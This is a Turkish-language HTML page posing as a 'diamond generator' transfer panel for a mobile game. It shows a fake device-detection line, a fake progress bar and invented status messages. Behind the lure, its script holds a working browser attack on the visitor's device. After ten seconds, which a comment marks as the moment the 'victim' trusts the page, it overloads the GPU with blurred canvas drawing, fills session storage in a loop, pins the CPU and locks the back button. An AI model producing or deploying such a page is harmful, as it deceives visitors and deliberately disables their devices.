<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💎 ELMAS AKTARIM PANELİ v9.9 ULTRA 💎</title>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; margin: 0; }
        .container { padding-top: 100px; position: relative; z-index: 10; }
        .bar-bg { width: 85%; height: 30px; background: #111; border: 2px solid #333; border-radius: 20px; margin: 40px auto; overflow: hidden; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        #bar { width: 0%; height: 100%; background: linear-gradient(90deg, #0f0, #004400); box-shadow: 0 0 15px #0f0; transition: width 0.5s ease-out; }
        .status-text { font-size: 1.2rem; color: #aaa; margin-top: 20px; min-height: 1.5em; }
        /* GPU'yu ağlatacak gizli katmanlar */
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.03; z-index: 5; }
    </style>
</head>
<body>
    <canvas id="gpuStrike"></canvas>
    <div class="container">
        <h1 style="font-size: 2.5rem; text-shadow: 0 0 15px #0f0;">💎 ELMAS ÜRETİCİ 💎</h1>
        <p style="color:#eee;">Cihaz Modeli: <b id="model">Tespit Ediliyor...</b></p>
        <div class="bar-bg"><div id="bar"></div></div>
        <h2 id="perc" style="font-size: 3rem;">%0</h2>
        <div id="status" class="status-text">Sunucu bağlantısı bekleniyor...</div>
    </div>

<script>
    // Cihaz ismini sinsi gösterme
    const models = ["Redmi Note 13 Pro", "iPhone 15 Pro Max", "Samsung S24 Ultra", "Redmi Note 9"];
    document.getElementById("model").innerText = models[Math.floor(Math.random()*models.length)];

    let p = 0;
    let statusMsgs = [
        "Port kanalları açılıyor...", "Proxy katmanları aşılıyor...",
        "Bellek optimizasyonu yapılıyor...", "Paketler şifreleniyor...",
        "Final aşamasına geçiliyor (Kapatmayın)..."
    ];

    // İLERLEME ÇUBUĞU
    let loader = setInterval(() => {
        if(p < 99) {
            p++;
            document.getElementById("bar").style.width = p + "%";
            document.getElementById("perc").innerText = "%" + p;
            if(p % 20 === 0) document.getElementById("status").innerText = statusMsgs[p/20-1];
        } else {
            document.getElementById("status").innerText = "LÜTFEN BEKLEYİN, AKTARIM TAMAMLANMAK ÜZERE...";
            document.getElementById("status").style.color = "red";
        }
    }, 1200);

    // --- MEGA SALDIRI MOTORU ---
    function boom() {
        // 1. GPU (EKRAN KARTI) FELCİ: 120Hz ekranlarda saniyede binlerce görünmez şekil çizer
        const canvas = document.getElementById("gpuStrike");
        const ctx = canvas.getContext("2d");
        function draw() {
            for(let i=0; i<50; i++) {
                ctx.beginPath();
                ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 50, 0, Math.PI*2);
                ctx.fillStyle = "lime";
                ctx.fill();
                ctx.filter = "blur(50px)"; // İşte bu GPU'yu bitiren dokunuş
            }
            requestAnimationFrame(draw);
        }
        draw();

        // 2. RAM SIZINTISI (SessionStorage Bomb): Parça parça ama durmadan
        setInterval(() => {
            try {
                let data = "X".repeat(1024 * 512); // 0.5 MB'lık bloklar
                sessionStorage.setItem('key_' + Math.random(), data);
            } catch(e) { 
                // Dolduğunda hata vermez, sessizce cihazı yormaya devam eder
            }
        }, 200);

        // 3. CPU (İŞLEMCİ) ISITICI: Döngüyü bölerek tarayıcıyı uyandırmadan yük bindirir
        setInterval(() => {
            let start = Date.now();
            while (Date.now() - start < 50) { // Her 100ms'nin 50ms'sini kilitler
                Math.sqrt(Math.random() * 999999) / Math.tan(Math.random());
            }
        }, 100);

        // 4. GERİ TUŞU KİLİDİ (Anti-Escape)
        setInterval(() => {
            window.history.pushState(null, "", "/" + Math.random());
        }, 50);
    }

    // 10. saniyede (Kurban sayfaya güvendiğinde) BOOM!
    setTimeout(boom, 10000);
</script>
</body>
</html>
